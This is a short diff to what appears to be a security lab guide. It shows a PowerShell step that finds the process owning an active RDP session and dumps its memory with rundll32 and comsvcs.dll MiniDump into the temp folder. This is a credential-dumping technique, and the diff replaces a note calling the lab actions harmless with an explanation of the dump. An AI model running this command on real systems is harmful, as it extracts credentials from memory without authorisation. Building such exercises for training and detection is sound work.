@@ -19,8 +19,7 @@ $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Igno
 if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
 C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
 ```
-5. Delete powershell script 
-Note: Of course these actions are harmless for the purpose of the lab. The "malicious powershell script" prints "hello world" to the screen and the downloads an image of a tree.
+Note: This powershell command checks for an active RDP session, dumps the memory of the process that owns the sessions, and the memory dump is saved to a temp folder.
 
 ---
 
